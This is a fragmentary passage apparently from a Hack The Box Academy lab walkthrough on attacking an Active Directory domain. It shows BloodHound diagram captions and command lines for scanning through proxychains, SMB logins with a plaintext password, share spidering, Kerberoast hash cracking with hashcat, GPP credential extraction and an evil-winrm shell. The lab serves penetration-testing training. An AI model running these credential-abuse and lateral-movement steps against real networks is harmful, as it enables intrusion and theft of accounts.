...
![Diagram showing user HPORTER@INLANEFREIGHT.LOCAL with local admin, execution, and outbound control rights. Connection to SSMALLS@INLANEFREIGHT.LOCAL via ForceChangePassword.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/hporter.png)
...
![Diagram showing DOMAIN USERS@INLANEFREIGHT.LOCAL with group membership and local admin rights. Connection to ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL via CanRDP.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/all_rdp.png)
...
```shell-session
xF1NN@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
...
```shell-session
xF1NN@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
...
```shell-session
xF1NN@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
...
```shell-session
xF1NN@htb[/htb]$ cat 172.16.8.3.json 
{
    "Department Shares": {
...
```shell-session
xF1NN@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 
...
```shell-session
xF1NN@htb[/htb]$ cat SQL\ Express\ Backup.ps1 
...
```shell-session
xF1NN@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
...
```shell-session
xF1NN@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
...
```shell-session
xF1NN@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50
...
```shell-session
xF1NN@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 
